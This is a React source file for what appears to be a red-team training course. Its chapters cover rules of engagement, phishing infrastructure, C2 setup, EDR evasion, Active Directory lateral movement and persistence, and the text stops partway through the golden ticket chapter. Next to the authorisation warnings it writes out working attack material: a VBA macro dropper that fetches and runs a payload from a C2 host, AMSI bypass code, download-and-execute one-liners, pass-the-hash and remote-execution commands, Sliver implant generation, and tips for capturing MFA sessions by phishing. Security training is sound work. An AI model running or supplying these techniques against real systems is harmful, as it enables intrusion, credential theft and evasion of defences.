'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#ff3333'
const mono = 'JetBrains Mono, monospace'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a3a3a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#080202', border: '1px solid #2a0000', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.85rem', fontWeight: 600, color: '#cc2222', marginTop: '1.75rem', marginBottom: '0.6rem' }}>&#9658; {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#9a8a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)
const Note = ({ type = 'info', children }: { type?: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
  const cfg: Record<string, [string, string]> = {
    info:   ['#ff3333', 'NOTE'],
    warn:   ['#ffb347', 'WARNING'],
    danger: ['#ff4136', 'CRITICAL'],
    tip:    ['#00ff41', 'PRO TIP'],
  }
  const [c, lbl] = cfg[type]
  return (
    <div style={{ background: c + '08', border: '1px solid ' + c + '33', borderLeft: '3px solid ' + c, borderRadius: '0 4px 4px 0', padding: '1rem 1.25rem', margin: '1.25rem 0' }}>
      <div style={{ fontFamily: mono, fontSize: '9px', color: c, letterSpacing: '0.2em', marginBottom: '6px' }}>{lbl}</div>
      <div style={{ color: '#8a9a9a', fontSize: '0.83rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #2a0000' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#cc2222', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #150000', background: i % 2 === 0 ? 'transparent' : 'rgba(255,51,51,0.015)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a8a8a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'rt-01',
    title: 'Red Team vs Pentest vs Bug Bounty',
    difficulty: 'BEGINNER',
    readTime: '6 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'Bug bounty = individual bugs, no persistence, immediate disclosure',
      'Penetration test = time-boxed, find-as-many-vulns-as-possible, stop before exfil',
      'Red team = APT simulation, objective-based, stealth paramount, may last months',
      'Purple team = red + blue collaborate to improve detection in real time',
      'Only red team truly tests whether defenders can DETECT AND RESPOND',
    ],
    content: (
      <div>
        <P>Understanding the distinction between these three disciplines is foundational before studying red team techniques. Each operates under different rules, incentives, and objectives. Mixing them up leads to scope creep, legal issues, and meaningless findings.</P>
        <Table
          headers={['Discipline', 'Duration', 'Objective', 'Stealth', 'Social/Physical', 'Deliverable']}
          rows={[
            ['Bug Bounty', 'Ongoing', 'Find individual bugs in scope', 'No', 'Usually no', 'Vulnerability report per bug'],
            ['Penetration Test', '1-4 weeks', 'Find as many vulns as possible', 'Optional', 'Rarely', 'Comprehensive report'],
            ['Red Team', 'Weeks-months', 'Reach crown jewel objective', 'Critical', 'Yes — full spectrum', 'Attack narrative + detection gaps'],
            ['Purple Team', 'Ongoing cycles', 'Improve detection together', 'No', 'Varies', 'Detection rule improvements'],
          ]}
        />
        <Pre label="// THE SPECTRUM IN PRACTICE">{`# Bug Bounty
# Focus: individual CVEs in defined scope
# Mindset: find it, report it, collect reward
# NOT a full security assessment — just bug hunting

# Penetration Test
# Focus: find ALL weaknesses in defined scope
# Methodology: PTES, OWASP Testing Guide, NIST 800-115
# Deliverable: prioritised vuln list with remediation steps
# Stop before achieving real-world impact (usually)

# Red Team Engagement
# Focus: simulate a SPECIFIC threat actor reaching a SPECIFIC goal
# "Crown jewel" = domain admin creds, customer PII, source code, finance data
# Only 2-3 people in the org know it's happening (excluding blue team)
# Tests: can defenders DETECT this? Can they RESPOND in time?
# NOT just about finding vulns — about measuring defender readiness

# Purple Team
# Red attacks → Blue watches in real time → tune detection rules
# Collaborative, transparent, iterative
# Best ROI for mature security programs`}</Pre>
        <Note type="warn">Red team engagements require explicit written authorisation covering every TTP you intend to use. Social engineering employees, physical access attempts, and attacking production systems all need separate sign-off. "Get to Domain Admin" is not sufficient scope documentation.</Note>
        <H3>TIBER-EU and Threat-Led Frameworks</H3>
        <P>TIBER-EU (Threat Intelligence-Based Ethical Red Teaming) is the European Central Bank framework for testing financial institutions. It mandates that red teams base their TTPs on actual threat intelligence about actors likely to target the organisation — not generic penetration testing. Similar frameworks: CBEST (UK), iCAST (Hong Kong), AASE (Australia). These are increasingly required for critical infrastructure.</P>
        <Pre label="// TIBER-EU PHASES">{`# Phase 1: Generic Threat Intelligence (GTI)
# External threat intel provider maps threat landscape for the sector
# Identifies most likely threat actors and their TTPs

# Phase 2: Targeted Threat Intelligence (TTI)
# Intelligence tailored to the specific target organisation
# OSINT + dark web research + past incident analysis

# Phase 3: Red Team Test
# Red team executes TTPs from TTI — simulating the named threat actors
# Tests specific detection scenarios mapped to threat intel

# Phase 4: Closure
# Purple team exercise — replay attacks with blue team present
# Update detection rules based on gaps found
# Formal attestation letter issued by regulator`}</Pre>
      </div>
    ),
  },
  {
    id: 'rt-02',
    title: 'Campaign Planning & Rules of Engagement',
    difficulty: 'INTERMEDIATE',
    readTime: '8 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'Never start any action without written Rules of Engagement (RoE) signed by authorised personnel',
      'Crown jewel definition drives every tactical decision in the engagement',
      'Emergency stop procedures and get-out-of-jail cards are non-negotiable',
      'Threat modelling the target organisation before scoping ensures realistic objectives',
      'The MITRE ATT&CK framework maps every TTP to a trackable technique ID',
    ],
    content: (
      <div>
        <P>Campaign planning is where red teams win or lose engagements before a single packet is sent. Poorly scoped engagements produce useless results. Well-scoped engagements generate findings that directly improve the organisation's defensive posture against real threat actors.</P>
        <H3>Rules of Engagement (RoE)</H3>
        <Pre label="// RoE MUST COVER THESE ITEMS">{`# 1. AUTHORISATION
# Written sign-off from C-level (CTO, CISO, CEO) — not just IT manager
# Explicit list of authorised TTPs
# Physical access: yes/no?
# Social engineering employees: yes/no?
# Production systems: in scope? read-only?

# 2. CROWN JEWELS (objectives)
# Be specific: "Obtain DA hash for corp.local domain"
# Not vague: "Test security"

# 3. SCOPE
# In-scope IP ranges and domains
# Explicitly out-of-scope systems (billing, life safety, OT/ICS)
# Third-party systems? (Cloud providers, SaaS tools)
# Business hours only? 24/7?

# 4. EMERGENCY PROCEDURES
# Incident stop code (word that halts everything immediately)
# Emergency contact (usually CISO mobile number)
# What to do if you accidentally cause disruption
# What to do if you find a REAL threat actor already present

# 5. GET-OUT-OF-JAIL DOCUMENTATION
# Physical card each operator carries
# "If detained: call [name] at [number]. This activity is authorised."
# Letter on company letterhead with engagement details`}</Pre>
        <H3>Attack Planning with MITRE ATT&CK</H3>
        <P>MITRE ATT&CK is a knowledge base of adversary tactics and techniques observed in real-world attacks. Every red team engagement should be planned and reported using ATT&CK technique IDs — this creates a common language between red and blue teams and maps directly to detection engineering.</P>
        <Pre label="// MAPPING TTPs TO ATT&CK">{`# Initial Access
T1566.001 — Spear phishing with attachment
T1566.002 — Spear phishing with link
T1190     — Exploit public-facing application
T1195     — Supply chain compromise

# Execution
T1059.001 — PowerShell
T1059.003 — Windows Command Shell
T1204.002 — Malicious file (user opens attachment)

# Persistence
T1053.005 — Scheduled Task
T1547.001 — Registry Run Keys
T1543.003 — Windows Service
T1078     — Valid Accounts (credential theft)

# Defence Evasion
T1562.001 — Disable/Modify Tools (kill AV)
T1055     — Process Injection
T1027     — Obfuscated Files
T1070.004 — File Deletion (clean up artefacts)

# Credential Access
T1003.001 — LSASS Memory dump
T1558.003 — Kerberoasting
T1110.003 — Password spraying

# Lateral Movement
T1021.002 — SMB/Windows Admin Shares
T1021.001 — Remote Desktop Protocol
T1550.002 — Pass the Hash

# Exfiltration
T1041     — Exfil over C2 channel
T1048.003 — Exfil over unencrypted/obfuscated protocol`}</Pre>
        <Note type="tip">Build your attack plan as a Navigator layer (.json file in ATT&CK Navigator). Colour-code techniques by phase. Share the completed layer in your report — blue team can immediately import it and see exactly which techniques they did and did not detect.</Note>
        <H3>Threat Modelling the Target</H3>
        <Pre label="// PRE-ENGAGEMENT OSINT">{`# What sector are they in?
# → Finance: APT38 (Lazarus Group), carbanak TTPs
# → Healthcare: ransomware groups (LockBit, BlackCat)
# → Defence: APT29 (Cozy Bear), APT28 (Fancy Bear)

# Technology stack recon:
# → Job postings reveal tech stack ("must know Splunk/CrowdStrike/Okta")
# → Shodan/Censys: exposed services
# → BuiltWith/Wappalyzer: web tech stack
# → LinkedIn: employee roles, org chart, security team size

# Historical exposure:
# → HaveIBeenPwned: past breach data
# → VirusTotal: previously submitted documents (metadata)
# → crt.sh: certificate transparency (all subdomains ever)
# → Wayback Machine: old exposed pages/configs

# Physical recon:
# → Google Maps: building layout, badge reader types, cameras
# → Glassdoor: internal processes, security culture
# → Social media: employee photos (badge visible? MFA device type?)`}</Pre>
      </div>
    ),
  },
  {
    id: 'rt-03',
    title: 'Initial Access Techniques',
    difficulty: 'INTERMEDIATE',
    readTime: '10 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'Phishing remains the most common initial access vector in real-world APT campaigns',
      'Supply chain compromise (attacking a vendor) bypasses perimeter controls entirely',
      'Evil twin and adversary-in-the-middle phishing kits capture MFA tokens in real time',
      'Living off the land binaries (LOLBins) blend malicious execution into trusted processes',
      'Combining multiple access vectors (spear phish + vishing callback) dramatically increases success rates',
    ],
    content: (
      <div>
        <P>Initial access is the hardest phase of a red team engagement. Modern perimeter defences — email gateways, EDR, MFA — have made the easy paths much harder. The techniques that work in 2024-2025 focus on human factors, supply chain weaknesses, and abusing trusted software.</P>
        <H3>Spear Phishing Infrastructure</H3>
        <Pre label="// BUILD A PHISHING INFRASTRUCTURE">{`# Domain selection — avoid typosquatting, use lookalike:
# target: corp.com → you: corp-helpdesk.com, corp-it-support.com
# Age the domain 30+ days before use (reputation scoring)
# Add MX records, SPF, DKIM, DMARC — makes it look legitimate

# Evilginx2 — Adversary-in-the-Middle phishing framework
# Captures MFA tokens by proxying real login page
git clone https://github.com/kgretzky/evilginx2
# Configure phishlet for target SSO (Microsoft 365, Okta, Google Workspace)
# Victim logs in → you capture session cookie → bypass MFA entirely

# GoPhish — phishing campaign management
# Track open rates, click rates, credential submission
# Integrate with Evilginx2 for full AiTM capability

# Email delivery tips:
# → Send from aged domain with valid SPF/DKIM
# → Avoid "click here" text (spam triggers)
# → Target Friday afternoons (lower suspicion, faster clicks)
# → Pretext must match current business context (invoice, HR update, IT alert)
# → Attach .docx with macros OR link to credential harvester
# → A/B test pretexts on small groups before full send`}</Pre>
        <H3>Macro-Based Initial Access</H3>
        <Pre label="// VBA MACRO DROPPER">{`' Macro runs when document opens (AutoOpen)
Sub AutoOpen()
    ' Download and execute payload in memory
    ' Fileless — nothing written to disk
    Dim xHttp As Object
    Dim bStrm As Object
    Dim sUrl As String

    sUrl = "https://your-c2.com/payload.ps1"
    Set xHttp = CreateObject("MSXML2.XMLHTTP")
    xHttp.Open "GET", sUrl, False
    xHttp.Send

    Dim sCmd As String
    sCmd = "powershell -nop -w hidden -enc " & EncodeB64(xHttp.responseText)
    Shell sCmd
End Sub

' Modern alternative: Excel 4.0 (XLM) macros
' Harder to detect than VBA, not blocked by default
' =EXEC("powershell -nop -w hidden -c IEX(wget http://c2/p.ps1)")`}</Pre>
        <H3>Supply Chain & Watering Hole</H3>
        <Pre label="// INDIRECT ACCESS VECTORS">{`# Supply chain attack
# Step 1: Identify vendors/contractors that access target systems
# Step 2: Compromise vendor (easier target, less mature security)
# Step 3: Use vendor's legitimate access pathway into target
# Real world: SolarWinds, 3CX, Kaseya VSA
# Why it works: target trusts the vendor's software implicitly

# Watering hole attack
# Step 1: Identify sites employees visit (industry forums, news sites)
# Step 2: Compromise that site or buy ads on it
# Step 3: Serve browser exploit or credential harvester to visitors
# Very targeted — only activate payload for target IP ranges

# USB drop (physical)
# Leave USB drives in car park, reception, meeting rooms
# Label: "Salary Review Q4 2025.docx" → curiosity drives insertion
# Payload executes on plug-in (autorun disabled on modern Windows)
# Use HID attack (Rubber Ducky) for guaranteed execution: acts as keyboard

# Callback phishing (vishing)
# Send email: "Call this number to verify your account"
# When they call: social engineer them into installing "support tool"
# AnyDesk/TeamViewer: legitimate remote access → you have GUI shell
# Used by: BazarCall campaign, LAPSUS$ group`}</Pre>
        <Note type="warn">Modern organisations increasingly use Business Email Compromise (BEC) detection and Adversary-in-the-Middle (AiTM) phishing detection. Rotate infrastructure per campaign, use different C2 domains per target, and implement proper domain categorisation (register domain, add innocent-looking content, wait for web reputation scoring before use).</Note>
      </div>
    ),
  },
  {
    id: 'rt-04',
    title: 'C2 Frameworks & Infrastructure',
    difficulty: 'ADVANCED',
    readTime: '12 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'C2 infrastructure must use redirectors to hide the actual teamserver IP',
      'Malleable C2 profiles make beacon traffic indistinguishable from legitimate application traffic',
      'DNS and ICMP beacons are the most egress-filter resistant communication channels',
      'OPSEC failures in C2 setup are the most common reason red teams get caught and burned',
      'Sliver and Havoc are mature open-source alternatives to the $3500/year Cobalt Strike license',
    ],
    content: (
      <div>
        <P>The C2 framework is the red team's nervous system — every implant calls home, every command flows through it, every piece of exfiltrated data passes through it. Building resilient, stealthy C2 infrastructure is as important as the techniques used to deploy implants.</P>
        <H3>C2 Architecture: The Right Way</H3>
        <Pre label="// PROPER C2 INFRASTRUCTURE">{`# NEVER expose your teamserver directly to the internet
# Use redirectors — disposable front-end servers that forward traffic

# Architecture:
# Victim → Redirector (VPS) → Teamserver (hardened, hidden)

# Redirector setup with Apache mod_rewrite:
# Only forward requests that match C2 traffic pattern
# Everything else: redirect to legitimate site (404 = burned)

# /etc/apache2/sites-available/redirector.conf
RewriteEngine On
# Only proxy requests with correct URI pattern
RewriteCond %{REQUEST_URI} ^/jquery-3\.7\.1\.min\.js [NC]
RewriteRule ^(.*)$ http://TEAMSERVER_IP:443%{REQUEST_URI} [P,L]
# Everything else → innocent site
RewriteRule ^(.*)$ https://jquery.com/ [R=302,L]

# Use multiple redirectors — rotate them if one gets burned
# Use CDNs (Cloudflare) as redirectors — teamserver IP never exposed
# Domain fronting: abuse CDN to make C2 traffic look like cdn.cloudflare.com`}</Pre>
        <H3>Cobalt Strike Fundamentals</H3>
        <Pre label="// COBALT STRIKE CORE CONCEPTS">{`# Beacon types:
# HTTP/HTTPS Beacon: calls back over web traffic (most common)
# DNS Beacon: commands encoded in DNS TXT records (stealthiest)
# SMB Beacon: peer-to-peer via named pipes (no internet required)
# TCP Beacon: direct TCP connection (internal pivoting)

# Malleable C2 Profile — make beacon look like legitimate traffic:
# Example: mimic legitimate jQuery requests

set sleeptime "45000";   # 45 second check-in interval
set jitter "30";          # +/-30% random variation

https-get {
  client {
    uri "/jquery-3.7.1.min.js";
    header "Accept" "text/html,application/xhtml+xml";
    header "Referer" "https://code.jquery.com/";
    header "Accept-Encoding" "gzip, deflate";
  }
  server {
    header "Content-Type" "application/javascript";
    output { mask; base64url; }
  }
}

# Key OPSEC settings:
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set dns_idle "8.8.8.8";     # DNS beacon idle - looks like Google DNS
set maxdns "255";`}</Pre>
        <H3>Sliver (Free, Open Source)</H3>
        <Pre label="// SLIVER C2 SETUP AND USAGE">{`# Install Sliver (BishopFox)
curl https://sliver.sh/install | sudo bash
# Or: https://github.com/BishopFox/sliver/releases

# Start teamserver:
sliver-server

# Generate implant (HTTPS):
generate --http your-c2-domain.com --os windows --arch amd64 \
  --name update-service --save ./implant.exe

# Generate implant (DNS — very stealthy):
generate --dns c2.your-domain.com --os windows --arch amd64 \
  --name dns-beacon --save ./dns-implant.exe

# Start listener:
https --domain your-c2-domain.com --lport 443

# When implant calls back:
sessions                          # list active sessions
use [session-id]                  # interact with session
shell                             # get interactive shell
screenshot                        # take screenshot
upload /local/file /remote/path   # upload file
download /remote/file .           # download file
execute-assembly /path/to/SharpHound.exe  # run .NET assembly in memory

# Multiplayer — add operators:
new-operator --name alice --lhost teamserver.internal
# Alice connects: sliver-client --config alice.cfg`}</Pre>
        <H3>OPSEC Considerations</H3>
        <Pre label="// AVOID GETTING BURNED">{`# Common OPSEC failures:
# 1. Teamserver responds to all requests (should only respond to beacons)
# 2. Default Cobalt Strike certificate (detectable by JA3 fingerprint)
# 3. Default listener ports (50050 for CS teamserver — blocked by most firewalls)
# 4. Beacon check-in too frequent (every 5 seconds = obvious in NetFlow)
# 5. Large single data transfer (DLP will flag)
# 6. C2 domain registered the day of the engagement

# Good OPSEC habits:
# Long sleep times (45-90 minutes for "low and slow" operations)
# Jitter (randomise timing so pattern analysis fails)
# Unique malleable profiles per engagement
# Rotate infrastructure mid-engagement if you suspect detection
# Clean up artefacts as you go (don't wait for end of engagement)
# Use legitimate cloud services as cover (AWS, Azure, Cloudflare)`}</Pre>
      </div>
    ),
  },
  {
    id: 'rt-05',
    title: 'AV / EDR Evasion',
    difficulty: 'ADVANCED',
    readTime: '12 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'Signature evasion (changing bytes) is trivial — modern EDR uses behavioral detection',
      'Process injection makes malicious code run under a trusted process name',
      'AMSI patching disables PowerShell script scanning before execution',
      'Unhooking ntdll.dll removes EDR visibility hooks at the lowest user-mode level',
      'Living off the Land (LOLBins) abuses signed Windows binaries — hardest to detect without context',
    ],
    content: (
      <div>
        <P>Antivirus detects files that match known-bad signatures. EDR (Endpoint Detection and Response) goes further — it instruments the OS kernel, hooks API calls, monitors process behaviour, and sends telemetry to a cloud analysis platform. Evading EDR in 2024 requires understanding exactly what it can and cannot see.</P>
        <H3>What EDR Instruments</H3>
        <Table
          headers={['EDR Visibility Point', 'What It Detects', 'Evasion Approach']}
          rows={[
            ['Userland API hooks (ntdll.dll)', 'Suspicious API call sequences', 'Unhook ntdll / use direct syscalls'],
            ['ETW (Event Tracing for Windows)', 'PowerShell script content, .NET execution', 'Patch ETW provider in memory'],
            ['AMSI (Antimalware Scan Interface)', 'PowerShell/JScript/VBA content', 'Patch amsiInitFailed flag'],
            ['Kernel callbacks (PsSetCreateProcessNotifyRoutine)', 'Process creation chains', 'Process hollowing / doppelganging'],
            ['File system minifilter', 'Files written to disk', 'Fileless/in-memory execution'],
            ['Network driver (NDIS filter)', 'C2 traffic patterns', 'Encrypted, blended C2 profiles'],
          ]}
        />
        <H3>AMSI Bypass</H3>
        <Pre label="// AMSI PATCHING IN POWERSHELL">{`# AMSI scans PowerShell scripts before execution
# Patching amsiInitFailed makes AMSI report "no scan needed"

# Method 1: Reflection-based patch
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Memory patch (more reliable, not string-detectable)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiContext', [Reflection.BindingFlags]'NonPublic,Static')
$c = $b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($c, 0x4, 0)

# Method 3: COM object bypass (avoids AMSI entirely)
$o = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
$o.Item(0).Navigate2("javascript:eval(atob('BASE64_PAYLOAD'))")`}</Pre>
        <H3>ntdll Unhooking</H3>
        <Pre label="// REMOVE EDR HOOKS FROM NTDLL">{`# EDR products hook ntdll.dll exports at userland level
# They overwrite the first bytes of functions like NtCreateThread
# with a JMP to their monitoring code
# Unhooking = restore original bytes from a clean copy

# C# unhooking approach (concept):
# 1. Load a fresh copy of ntdll.dll from disk (not the hooked one in memory)
# 2. Compare the .text section of fresh vs loaded ntdll
# 3. Overwrite hooked bytes with clean bytes

# PowerShell unhook using P/Invoke:
$ntdll = [System.Diagnostics.Process]::GetCurrentProcess().Modules |
  Where-Object { $_.ModuleName -eq "ntdll.dll" }
$ntdllBase = $ntdll.BaseAddress

# Read fresh ntdll from disk (EDR hooks only affect in-memory copy):
$bytes = [System.IO.File]::ReadAllBytes("C:\\Windows\\System32\\ntdll.dll")
# Map and copy .text section over hooked in-memory version
# (requires VirtualProtect to make section writable first)`}</Pre>
        <H3>Process Injection Techniques</H3>
        <Pre label="// CLASSIC PROCESS INJECTION METHODS">{`# 1. Classic Remote Thread Injection (noisy, well-detected)
# OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

# 2. Process Hollowing (better OPSEC)
# Spawn legitimate process (svchost.exe) in SUSPENDED state
# Unmap its memory, write your payload, resume thread
# Process appears as svchost.exe in task manager

# 3. APC Injection (Asynchronous Procedure Call)
# Queue APC to all threads of target process
# Executes shellcode next time thread enters alertable state
# Less monitored than CreateRemoteThread

# 4. Module Stomping
# Load a legitimate DLL into target process
# Overwrite its .text section with shellcode
# Module shows up as legitimate DLL in module list

# 5. Thread Hijacking
# Suspend thread of target process
# Modify CONTEXT.Rip to point to shellcode
# Resume thread — executes your code

# Tool: Donut (generates shellcode from .NET assemblies/EXEs)
donut -f SharpHound.exe -o loader.bin -a x64
# Then inject loader.bin into svchost.exe memory
# SharpHound runs without ever touching disk`}</Pre>
        <Note type="danger">EDR bypass techniques are constantly patched as vendors update signatures and behavioral rules. What works today may be detected in 30 days. Always test your payload chain against the target's specific EDR product in a lab environment before the engagement.</Note>
      </div>
    ),
  },
  {
    id: 'rt-06',
    title: 'Internal Recon & Lateral Movement',
    difficulty: 'ADVANCED',
    readTime: '10 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'APTs spend most of their dwell time in internal recon — patience is the differentiator',
      'BloodHound/SharpHound maps the full AD attack graph in minutes',
      'Pass-the-Hash works because NTLM authentication does not require the plaintext password',
      'WMI and DCOM are stealthier lateral movement vectors than PsExec (less EDR coverage)',
      'Pivoting through compromised hosts is essential to reach segmented network zones',
    ],
    content: (
      <div>
        <P>Once inside, the goal is not to immediately run to the crown jewel — it is to understand the environment completely before making any noisy moves. Patience and methodical enumeration separate professional red teams from amateurs who get caught within hours.</P>
        <H3>Situational Awareness (First 5 Minutes on Host)</H3>
        <Pre label="// INITIAL FOOTHOLD ENUMERATION">{`# Who am I and what can I do?
whoami /all                    # Username, groups, privileges
net localgroup administrators  # Who else is local admin?
systeminfo                     # OS, patches, architecture
ipconfig /all                  # Network interfaces, DNS servers

# Am I in a VM/sandbox? (malware often checks this)
Get-WmiObject Win32_ComputerSystem | select Manufacturer,Model
# VMware: Manufacturer = "VMware, Inc."
# Hyper-V: Manufacturer = "Microsoft Corporation"

# What's running?
tasklist /svc                  # Processes with services
Get-Process | sort CPU -desc   # Heavy processes (AV/EDR?)
netstat -ano                   # Active connections

# What security tools are present?
Get-Service | where {$_.Name -match "defender|cylance|crowdstrike|carbon|sentinel"}
reg query HKLM\SOFTWARE\Wow6432Node\ | findstr -i "security\|endpoint\|threat"

# Credential hunting (before any network moves):
cmdkey /list                                    # Cached credentials
dir C:\Users\*\AppData\Roaming\*\profiles.ini  # Firefox/Thunderbird
dir C:\Users\*\Desktop\*.txt                   # Password files on desktop
dir C:\Users\*\Documents\ /s | findstr /i "pass\|cred\|secret\|key"`}</Pre>
        <H3>Active Directory Enumeration</H3>
        <Pre label="// SHARPHOUND + BLOODHOUND">{`# SharpHound — collects AD data (runs on compromised host)
# Download and run in memory (avoid writing to disk):
IEX(New-Object Net.WebClient).downloadString('http://C2/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\

# Or run pre-compiled binary:
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\
# Output: ZIP file with JSON — exfil to your machine, import to BloodHound

# BloodHound queries (run in Neo4j browser):
# Shortest path to Domain Admin from any owned node:
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

# All Kerberoastable users:
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.description

# Users with DCSync rights:
MATCH p=(n)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN p

# Computers where Domain Admin has sessions right now:
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer) RETURN u.name, c.name`}</Pre>
        <H3>Pass-the-Hash Lateral Movement</H3>
        <Pre label="// LATERAL MOVEMENT TECHNIQUES">{`# Pass-the-Hash (NTLM auth doesn't need plaintext password)
# Requires: local admin rights on target + NTLM hash

# CrackMapExec — spray hash across subnet:
cme smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH \
  --local-auth -x "whoami" 2>/dev/null | grep "+"

# Impacket suite:
python3 psexec.py -hashes :NTLM_HASH DOMAIN/admin@TARGET     # Noisy (creates service)
python3 wmiexec.py -hashes :NTLM_HASH DOMAIN/admin@TARGET    # Stealthier
python3 smbexec.py -hashes :NTLM_HASH DOMAIN/admin@TARGET    # Semi-interactive

# Pass-the-Ticket (Kerberos)
# Steal TGT from memory → use on any host
mimikatz # sekurlsa::tickets /export                          # Export all tickets
Rubeus.exe ptt /ticket:ticket.kirbi                          # Import ticket
klist                                                         # Verify loaded

# DCOM lateral movement (very stealthy — uses legitimate COM):
$dcom = [System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"-enc BASE64PAYLOAD","7")

# WMI (also stealthy):
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create \
  -ArgumentList "powershell -enc BASE64PAYLOAD"`}</Pre>
        <H3>Pivoting into Segmented Networks</H3>
        <Pre label="// PIVOTING TECHNIQUES">{`# Situation: compromised host A can reach network B, your C2 cannot

# Socks proxy via Sliver/CS beacon:
socks5 start --port 1080    # Sliver command
# On attack box: proxychains4 nmap -sT -Pn TARGET_IN_B

# SSH dynamic port forward (if you have SSH access):
ssh -D 1080 -N compromised-host   # SOCKS5 proxy on localhost:1080

# Chisel (tunnel tool — cross-platform):
# On attack box (server):
chisel server --port 8080 --reverse
# On compromised host (client):
chisel client YOUR_SERVER:8080 R:1080:socks   # Reverse SOCKS5

# Port forward for specific service:
chisel client YOUR_SERVER:8080 R:3389:INTERNAL_TARGET:3389
# Now RDP to localhost:3389 → connects to INTERNAL_TARGET:3389

# Metasploit route:
route add 10.10.10.0/24 SESSION_ID   # Route traffic through meterpreter session`}</Pre>
      </div>
    ),
  },
  {
    id: 'rt-07',
    title: 'Persistence & Privilege Escalation',
    difficulty: 'ADVANCED',
    readTime: '10 min',
    labLink: '/modules/red-team/lab',
    takeaways: [
      'Persistence must survive reboots, AV scans, and log rollover — test all three',
      'WMI subscriptions are among the most persistent and least-detected mechanisms',
      'Golden tickets survive domain password resets and last up to 10 years by default',
      'Kerberos delegation abuse lets you impersonate ANY user to ANY service without cracking passwords',
      'Domain persistence should only be established after thorough internal recon — premature persistence gets caught',
    ],
    content: (
      <div>
        <P>Persistence ensures the engagement survives password changes, reboots, and defensive response. Privilege escalation transforms local admin into domain admin — the crown jewel for most AD-connected environments. These two phases are often interleaved: escalate, persist, escalate further.</P>
        <H3>Local Privilege Escalation</H3>
        <Pre label="// ESCALATE TO SYSTEM/ADMIN">{`# Automated enumeration:
winPEAS.exe > winpeas-output.txt   # Full local privesc checks
# PowerUp.ps1 (PowerSploit):
IEX(New-Object Net.WebClient).downloadString('http://C2/PowerUp.ps1')
Invoke-AllChecks | Out-File -FilePath C:\Windows\Temp\privesc.txt

# Common paths to SYSTEM:
# 1. Unquoted service paths:
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# → If path has spaces without quotes, drop binary in exploitable location

# 2. Weak service permissions:
Get-ServiceAcl | where {$_.Access -match "Everyone|BUILTIN\\Users"} | select ServiceName
# → Modify service binary path → restart service → SYSTEM

# 3. Token impersonation (common from IIS, SQL service accounts):
# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege present:
PrintSpoofer.exe -i -c cmd.exe     # Windows 10/Server 2019
RoguePotato.exe -r IP -e cmd.exe   # Server 2019+
JuicyPotatoNG.exe -t * -p cmd.exe  # Universal CLSID search

# 4. AlwaysInstallElevated:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both 0x1 → msiexec /quiet /qn /i malicious.msi → SYSTEM`}</Pre>
        <H3>Domain Persistence: Golden & Silver Tickets</H3>
        <Pre label="// GOLDEN TICKET = UNLIMITED DOMAIN ACCESS">{`# Golden Ticket = forged TGT signed with KRBTGT hash
# Survives: password resets for ALL user accounts (except KRBTGT)
# Valid for: up to 10 years by default
# Works even when original account is deleted

# Step 1: Get KRBTGT hash (requires DA first — DCSync)
